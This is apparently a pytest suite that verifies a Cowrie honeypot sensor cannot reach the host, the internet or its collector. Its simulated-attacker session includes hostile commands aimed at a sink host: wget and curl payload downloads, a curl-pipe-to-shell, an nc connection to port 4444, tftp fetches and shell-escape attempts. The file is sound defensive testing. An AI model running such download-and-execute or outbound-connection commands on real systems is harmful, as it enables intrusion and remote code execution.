"""The isolation boundary of a deployed sensor (design doc 2.2-2.4).

Every negative result has a positive control next to it, so "nothing
happened" means the boundary held, not that the test environment was broken.
"""

from __future__ import annotations

import ipaddress
import json
import time

import pytest

from conftest import (
    ADMIN_PORT, COLLECTOR_ADDR, COLLECTOR_CONTAINER, COLLECTOR_PORT, COWRIE_IMAGE, COWRIE_NETWORK, EVIDENCE,
    HONEYPOT_PORT, NETNS, SENSOR_ADDR, SENSOR_ID, SINK, can_login, client, collector, collector_ids, cowrie_events,
    cowrie_lines, host_name, is_active, line_ids, session, sh, tcp_from, wait_for,
)

UNITS = [
    "bearjug-firewall.service",
    "docker.service",
    "bearjug-diskguard.service",
    "bearjug-shipper.service",
    "bearjug-cowrie.service",
    "bearjug-firewall-check.timer",
]


def inspect():
    return json.loads(sh("docker", "inspect", "bearjug-cowrie").stdout)[0]


# --- host preparation ------------------------------------------------------------


@pytest.mark.parametrize("unit", UNITS)
def test_units_are_active(unit):
    assert is_active(unit) == "active"


def test_evidence_volume_is_its_own_encrypted_noexec_filesystem():
    mnt = json.loads(sh("findmnt", "--json", "--target", str(EVIDENCE)).stdout)["filesystems"][0]
    root = json.loads(sh("findmnt", "--json", "/").stdout)["filesystems"][0]
    assert mnt["target"] == str(EVIDENCE) and mnt["source"] != root["source"]
    assert {"noexec", "nodev", "nosuid"} <= set(mnt["options"].split(","))
    status = sh("cryptsetup", "status", mnt["source"]).stdout
    assert "type:    LUKS2" in status and "cipher:  aes-xts-plain64" in status


@pytest.mark.parametrize("account", ["bearjug-cowrie", "bearjug-shipper", "bearjug-guard"])
def test_service_accounts_are_unprivileged(account):
    entry = sh("getent", "passwd", account).stdout.strip().split(":")
    assert entry[6] == "/usr/sbin/nologin" and int(entry[2]) < 1000
    groups = set(sh("id", "-nG", account).stdout.split())
    assert not groups & {"sudo", "adm", "docker", "root", "disk", "lxd"}


# --- Cowrie isolation ------------------------------------------------------------


def test_cowrie_container_is_locked_down():
    c = inspect()
    host = c["HostConfig"]
    assert c["Config"]["Image"] == COWRIE_IMAGE
    assert host["ReadonlyRootfs"] is True
    assert host["CapDrop"] == ["ALL"] and not host.get("CapAdd")
    assert host["Privileged"] is False
    assert any(o.startswith("no-new-privileges") for o in host["SecurityOpt"])
    uid = c["Config"]["User"].split(":")[0]
    assert uid.isdigit() and int(uid) != 0
    assert host["NetworkMode"] == COWRIE_NETWORK
    assert host["Dns"] == ["127.0.0.1"]
    assert host["PidsLimit"] and host["Memory"]
    assert host["PortBindings"] == {"2222/tcp": [{"HostIp": "", "HostPort": str(HONEYPOT_PORT)}]}
    mounts = {m["Destination"]: m for m in c["Mounts"]}
    assert set(mounts) == {"/srv/cowrie", "/cowrie/cowrie-git/etc"}
    assert mounts["/srv/cowrie"]["Source"] == str(EVIDENCE / "cowrie")
    assert mounts["/cowrie/cowrie-git/etc"]["RW"] is False
    assert not any("docker.sock" in (m.get("Source") or "") for m in c["Mounts"])


def run_in_cowrie(code):
    return sh("docker", "exec", "bearjug-cowrie", "python3", "-c", code, check=False)


def test_container_has_no_shell_and_sees_no_host_secrets():
    assert sh("docker", "exec", "bearjug-cowrie", "/bin/sh", "-c", "true", check=False).returncode != 0
    r = run_in_cowrie(
        "import os; print([p for p in ['/var/run/docker.sock', '/run/docker.sock', '/etc/bearjug', "
        "'/srv/cowrie/../shipper', '/root/.ssh', '/etc/shadow'] if os.path.exists(p)])"
    )
    assert r.returncode == 0 and r.stdout.strip() == "[]", r.stdout + r.stderr


def test_container_dns_is_not_forwarded_by_docker():
    """Docker's embedded resolver forwards lookups from the host's network
    namespace (outside the container firewall) unless the container's DNS
    server is a loopback address."""
    resolv = run_in_cowrie("print(open('/etc/resolv.conf').read())").stdout
    assert "ExtServers: [127.0.0.1]" in resolv and "host(" not in resolv


# --- the attacker's view ------------------------------------------------------------


def test_synthetic_credential_logs_in_and_nothing_else_does():
    assert can_login()
    for user, password in [("root", "123456"), ("root", "root"), ("admin", "admin"), ("deploy", "wrong"),
                           ("ubuntu", "ubuntu")]:
        assert not can_login(user, password), (user, password)


MARKERS = [f"BJMARK{i}" for i in range(1, 8)]


def test_attacker_explores_the_simulated_system_and_nothing_runs_on_the_host(sink):
    results = session(
        "uname -a",
        "id",
        "cat /etc/passwd",
        "ls -la /",
        "free -m",
        f"bash -c 'touch /tmp/{MARKERS[0]}'",
        f'sh -c "touch /tmp/{MARKERS[1]}"',
        f"echo $(touch /tmp/{MARKERS[2]})",
        f"echo `touch /tmp/{MARKERS[3]}`",
        f"touch /tmp/{MARKERS[4]} && chmod +x /tmp/{MARKERS[4]} && /tmp/{MARKERS[4]}",
        f"echo | python -c 'open(\"/tmp/{MARKERS[5]}\", \"w\")'",
        f"echo | perl -e 'open(F, \">/tmp/{MARKERS[6]}\")'",
        "ls /tmp",
    )
    by_cmd = {r["command"]: r for r in results}
    assert "prod-db-01" in by_cmd["uname -a"]["output"]
    assert "root:x:0:0" in by_cmd["cat /etc/passwd"]["output"]
    # The simulated machine's memory, not the sensor's.
    assert "16Gi" in session("free -h")[0]["output"] or "15982" in by_cmd["free -m"]["output"]

    # Nothing on the host: the evidence volume, the places a stray write
    # would land, and Docker's storage.
    places = [str(EVIDENCE), "/tmp", "/var/tmp", "/root", "/home", "/srv", "/opt", "/etc", "/var/lib/docker"]
    found = sh("find", *places, "-name", "BJMARK*", check=False, timeout=600).stdout
    assert found.strip() == ""
    # Nothing inside the container either (its /tmp is a real tmpfs).
    assert run_in_cowrie("import os; print(os.listdir('/tmp'))").stdout.strip() == "[]"
    # Only Cowrie runs in the container.
    top = sh("docker", "top", "bearjug-cowrie", "-o", "pid,args").stdout.splitlines()[1:]
    assert len(top) == 1 and "bearjug_entrypoint.py" in top[0], top
    assert sink.hits_since_mark() == []


SIMULATED = {
    "wget": f"wget http://{SINK}/payload.sh",
    "curl": f"curl -O http://{SINK}:8000/payload.sh",
    "curl-https": f"curl -sS https://{SINK}/",
    "busybox-wget": f"busybox wget http://{SINK}/x",
    "nc": f"nc -v {SINK} 4444",
    "ftpget": f"ftpget -u anonymous -p pw {SINK} local.bin remote.bin",
    "tftp": f"tftp -g -r payload.bin {SINK}",
    "wget-name": "wget http://updates.example.net/payload.sh",
    "curl-pipe-sh": f"curl -s http://{SINK}/i.sh | sh",
}


def test_simulated_network_tools_never_reach_the_internet(sink):
    before = len(cowrie_events())
    results = session(*SIMULATED.values(), "ls -la", timeout=60)
    assert all(r["rc"] != 0 for r in results[:-1] if "| sh" not in r["command"]), results
    assert "Temporary failure in name resolution" in results[7]["output"]
    time.sleep(3)
    assert sink.hits_since_mark() == []
    events = [e for e in cowrie_events()[before:] if e["eventid"] == "bearjug.outbound.simulated"]
    assert {e["tool"] for e in events} >= {"wget", "curl", "nc", "ftpget", "tftp"}
    assert all(e["simulated"] is True for e in events)
    assert [e for e in events if e["tool"] == "ftpget"][0]["password"] == "pw"  # marked sensitive
    assert not any((EVIDENCE / "cowrie/downloads").iterdir())


def test_ssh_forwarding_is_refused_and_recorded(sink):
    before = len(cowrie_events())
    reply = client("forward", dst=[SINK, 80])
    assert reply["direct_tcpip"].startswith("refused"), reply
    assert reply["remote_forward"].startswith("refused"), reply
    time.sleep(2)
    assert sink.hits_since_mark() == []
    events = [e for e in cowrie_events()[before:] if e["eventid"] == "cowrie.direct-tcpip.request"]
    assert events and events[0]["dst_ip"] == SINK and events[0]["refused"] is True
    assert not tcp_from(NETNS, SENSOR_ADDR, 8080)  # no remote-forward listener appeared


# --- network boundaries ------------------------------------------------------------

CANARY = r"""
import json, socket
out = {}
def tcp(h, p):
    try:
        socket.create_connection((h, p), 3).close(); return "connected"
    except Exception as e:
        return type(e).__name__
def udp(h, p):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(2)
    try:
        s.sendto(b"bearjug-canary", (h, p)); s.recvfrom(64); return "reply"
    except Exception as e:
        return type(e).__name__
gw = "GATEWAY"
for h, p in [("SINK", 80), ("SINK", 4444), ("SINK", 8000), ("COLLECTOR", COLLECTOR_PORT), (gw, ADMIN_PORT),
             (gw, 22), (gw, 2222), ("1.1.1.1", 443), ("8.8.8.8", 53)]:
    out[f"tcp {h}:{p}"] = tcp(h, p)
for h, p in [("SINK", 53), ("SINK", 69), ("8.8.8.8", 53)]:
    out[f"udp {h}:{p}"] = udp(h, p)
try:
    socket.getaddrinfo("example.com", 80); out["dns"] = "resolved"
except Exception as e:
    out["dns"] = type(e).__name__
print(json.dumps(out))
"""


def test_egress_firewall_holds_without_cowrie(sink):
    """A deliberately network-capable program on Cowrie's network (the same
    image, network and DNS settings as Cowrie) gets nothing out."""
    ipam = json.loads(sh("docker", "network", "inspect", COWRIE_NETWORK).stdout)[0]["IPAM"]["Config"][0]
    # Docker records the gateway only when it was given explicitly; otherwise
    # it is the subnet's first address.
    gateway = ipam.get("Gateway") or str(next(ipaddress.ip_network(ipam["Subnet"]).hosts()))
    code = (CANARY.replace('"SINK"', repr(SINK)).replace('"COLLECTOR"', repr(COLLECTOR_ADDR))
            .replace("COLLECTOR_PORT", str(COLLECTOR_PORT)).replace("ADMIN_PORT", str(ADMIN_PORT))
            .replace('"GATEWAY"', repr(gateway)))
    uid_gid = inspect()["Config"]["User"]
    r = sh("docker", "run", "--rm", "--network", COWRIE_NETWORK, "--dns", "127.0.0.1", "--cap-drop", "ALL",
           "--user", uid_gid, "--entrypoint", "python3", COWRIE_IMAGE, "-c", code, timeout=180)
    results = json.loads(r.stdout)
    assert not [k for k, v in results.items() if v in ("connected", "reply", "resolved")], results
    time.sleep(2)
    assert sink.hits_since_mark() == []
    counters = sh("nft", "list", "chain", "inet", "bearjug", "forward").stdout
    assert "cowrie egress denied" in counters


def test_only_the_shipper_reaches_the_collector():
    def as_user(user):
        code = f"import socket; socket.create_connection(({COLLECTOR_ADDR!r}, {COLLECTOR_PORT}), 3).close()"
        return sh("runuser", "-u", user, "--", "python3", "-c", code, check=False, timeout=20).returncode == 0

    assert as_user("bearjug-shipper")  # positive control
    for user in ["root", "bearjug-guard", "bearjug-cowrie", "nobody"]:
        assert not as_user(user), user


def test_collector_cannot_initiate_into_the_sensor():
    addrs = {SENSOR_ADDR}
    addrs |= {a for a in sh("hostname", "-I").stdout.split() if ":" not in a}
    coll_gw = json.loads(sh("docker", "inspect", COLLECTOR_CONTAINER).stdout)[0]["NetworkSettings"]["Networks"]
    addrs |= {n["Gateway"] for n in coll_gw.values() if n.get("Gateway")}
    code = ("import socket,json,sys\nr={}\n"
            "for h in sys.argv[1].split(','):\n"
            "  for p in (22, 2222, 22022, 8443, 80):\n"
            "    try:\n      socket.create_connection((h,p),3).close(); r[f'{h}:{p}']='connected'\n"
            "    except Exception as e: r[f'{h}:{p}']=type(e).__name__\n"
            "print(json.dumps(r))")
    r = sh("docker", "exec", COLLECTOR_CONTAINER, "python3", "-c", code, ",".join(sorted(addrs)), timeout=300)
    results = json.loads(r.stdout)
    assert not [k for k, v in results.items() if v == "connected"], results
    assert tcp_from(NETNS, SENSOR_ADDR, HONEYPOT_PORT)  # the same port is open to everyone else


def test_admin_ssh_is_listening_but_not_for_the_internet():
    assert f":{ADMIN_PORT} " in sh("ss", "-Hltn").stdout
    assert not tcp_from(NETNS, SENSOR_ADDR, ADMIN_PORT)


def test_events_never_carry_the_sensors_host_name():
    events = cowrie_events()
    assert events and all(e.get("sensor") == SENSOR_ID for e in events)
    name = host_name()
    assert name not in (EVIDENCE / "cowrie/log/cowrie.json").read_text()


# --- delivery ------------------------------------------------------------------


def test_evidence_reaches_the_collector_and_is_removed_from_the_sensor():
    session("echo delivery-check", "whoami")
    lines = cowrie_lines()
    wanted = line_ids(lines)
    wait_for(lambda: wanted <= collector_ids(), 120, 2, "every cowrie.json line at the collector")
    # Closed TTY logs are shipped and then removed from the spool.
    tty = EVIDENCE / "cowrie/tty"
    wait_for(lambda: not any(p.name and len(p.name) == 64 for p in tty.iterdir()), 120, 2, "TTY logs to be removed")
    # And the collector stored TTY logs from this sensor.
    listing = collector("list").stdout
    assert " tty.log " in listing and SENSOR_ID in listing

